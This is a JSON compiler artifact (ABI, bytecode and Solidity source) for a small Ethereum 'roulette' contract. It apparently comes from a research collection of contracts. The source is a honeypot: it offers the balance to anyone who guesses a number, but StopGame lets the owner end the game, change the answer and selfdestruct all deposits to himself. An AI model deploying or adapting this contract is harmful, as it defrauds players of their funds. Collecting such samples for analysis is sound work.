{
  "contractName": "R",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "rouletteOwner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "result",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "finished",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "StartRoulette",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060006101000a81548160ff021916908360ff16021790555060008060016101000a81548160ff02191690831515021790555034801561004557600080fd5b5061045d806100556000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063039997951461007a57806365372147146100d1578063ab5783c414610102578063b2c3609b14610125578063bef4876b14610148578063f1b6315e14610177575b005b34801561008657600080fd5b5061008f61019a565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100dd57600080fd5b506100e66101c0565b604051808260ff1660ff16815260200191505060405180910390f35b610123600480360381019080803560ff1690602001909291905050506101d2565b005b610146600480360381019080803560ff16906020019092919050505061029d565b005b34801561015457600080fd5b5061015d610388565b604051808215151515815260200191505060405180910390f35b610198600480360381019080803560ff16906020019092919050505061039b565b005b600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900460ff1681565b600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561022e57600080fd5b610236610414565b806000806101000a81548160ff021916908360ff16021790555066038d7ea4c6800034111561029a57600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b50565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102d757600080fd5b8060ff166000809054906101000a900460ff1660ff16148015610300575066038d7ea4c6800034115b80156103195750600060019054906101000a900460ff16155b15610385573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561037b573d6000803e3d6000fd5b50610384610414565b5b50565b600060019054906101000a900460ff1681565b60008060009054906101000a900460ff1660ff16141561041157806000806101000a81548160ff021916908360ff16021790555033600060026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6001600060016101000a81548160ff0219169083151502179055505600a165627a7a72305820209c8e22c7f3543b37cd9bf1eedb6530de201bd101e7865339ee70b9bfdf046a0029",
  "source": "\n\ncontract R\n{\n\n    uint8 public result = 0;\n\n    bool public finished = false;\n\n    address public rouletteOwner;\n\n    function Play(uint8 _number)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        if(result == _number && msg.value>0.001 ether && !finished)\n        {\n            msg.sender.transfer(this.balance);\n            GiftHasBeenSent();\n        }\n    }\n\n    function StartRoulette(uint8 _number)\n    public\n    payable\n    {\n        if(result==0)\n        {\n            result = _number;\n            rouletteOwner = msg.sender;\n        }\n    }\n\n    function StopGame(uint8 _number)\n    public\n    payable\n    {\n        require(msg.sender == rouletteOwner);\n        GiftHasBeenSent();\n        result = _number;\n        if (msg.value>0.001 ether){\n            selfdestruct(rouletteOwner);\n        }\n    }\n\n    function GiftHasBeenSent()\n    private\n    {\n        finished = true;\n    }\n\n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xd87eaad7afb256c69526a490f402a658f12246fd/contracts/0xd87eaad7afb256c69526a490f402a658f12246fd.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:08:04.115Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}